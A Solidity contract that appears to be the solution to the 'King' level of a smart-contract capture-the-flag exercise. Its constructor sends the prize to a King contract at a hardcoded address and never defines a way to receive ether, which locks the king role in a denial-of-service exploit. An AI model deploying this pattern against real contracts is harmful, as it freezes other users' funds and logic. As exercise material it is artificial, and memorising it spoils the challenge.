// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/King.sol";

contract KingSolution {
    King king = King(payable(0xA44112E29d1265A7F19ac4F59720D6484E2Cdd5b));
    constructor() public payable {
        address(king).call{value: king.prize()}("");
    }
}
